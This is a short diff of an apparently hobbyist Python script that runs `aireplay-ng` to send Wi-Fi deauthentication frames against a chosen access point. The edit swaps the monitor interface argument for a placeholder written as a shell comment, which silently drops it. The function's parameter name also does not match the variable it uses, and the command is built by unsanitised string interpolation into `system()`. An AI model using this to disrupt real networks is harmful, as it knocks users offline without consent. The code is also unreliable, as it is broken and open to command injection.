@@ -11,7 +11,7 @@ with open("settings.set", "r") as read_adapter:
 	adapter = read_adapter.read()
 	
 def deauthentication(Bssid, Deauth_Count):
-	system(f"sudo aireplay-ng --deauth {Deauth_Count} -a {bssid} ({adapter}+'mon')")
+	system(f"sudo aireplay-ng --deauth {Deauth_Count} -a {bssid} #Your cards name + mon#")
 
 if options == "Net":
 	deauthentication(bssid, deauth_count)
